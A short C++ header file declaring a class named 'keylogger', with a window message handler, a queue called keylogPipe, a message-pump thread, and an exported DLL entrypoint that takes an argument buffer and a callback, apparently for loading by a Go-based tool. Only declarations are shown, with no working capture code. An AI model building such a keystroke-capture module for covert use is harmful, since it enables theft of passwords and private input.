#pragma once
#include "pch.h"
#include "WinMsgHandler.h"
#include "SharedQueue.h"

class keylogger
{
public:


private:	
	std::unique_ptr<WinMsgHandler> _keyloggerWin;
	std::shared_ptr<SharedQueue> keylogPipe;
	std::unique_ptr<std::thread> messagePump;
};

typedef int (*goCallback)(const char*, int);

extern "C" {
	__declspec(dllexport) int __cdecl entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback);
}